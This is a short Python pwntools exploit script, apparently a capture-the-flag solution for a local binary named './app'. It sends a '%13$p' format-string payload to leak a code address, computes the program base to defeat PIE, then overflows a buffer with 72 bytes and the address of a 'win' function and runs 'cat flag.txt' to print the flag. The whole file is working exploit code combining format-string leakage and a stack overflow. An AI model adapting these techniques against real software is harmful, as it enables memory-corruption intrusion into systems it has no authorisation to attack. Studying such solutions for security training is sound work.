#!/usr/bin/env python3

from pwn import *
from pwn import p64

context.terminal = ["tmux", "splitw", "-h"]

path = "./app"
exe = ELF(path)

gdbscript = """
b * ready_reader + 93
c
"""

# io = gdb.debug(path, gdbscript=gdbscript)
io = process(path)
# io = remote("localhost", 1337)

payload = b"%13$p"
io.sendlineafter(b"Username:", payload)
payload = b"B"
io.sendlineafter(b"Password:", payload)

pie_leak = io.recvline().strip().split(b" ")[-1]
pie_leak = int(pie_leak, 16)
info(f"{hex(pie_leak) = }")

exe.address = pie_leak - exe.symbols["main"] - 24
info(f"{hex(exe.address) = }")
info(f"{hex(exe.symbols['win']) = }")

payload = 72 * b"A"
payload += p64(exe.symbols['win'])
io.sendlineafter(b"already.", payload)

io.recvuntil(b"?!\n")
io.sendline(b"cat flag.txt")
success(f"Flag: {io.recvline().strip().decode()}")
io.close()
# io.interactive()
